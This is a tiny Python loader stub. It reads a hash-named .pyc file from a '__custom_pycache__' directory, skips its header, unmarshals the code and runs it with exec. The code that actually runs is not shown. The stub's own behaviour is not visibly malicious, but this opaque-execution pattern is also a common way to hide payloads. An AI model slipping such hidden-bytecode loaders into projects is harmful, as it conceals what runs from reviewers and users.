
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'params_09b5a64612bb4d49a63dd85cc6217712.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
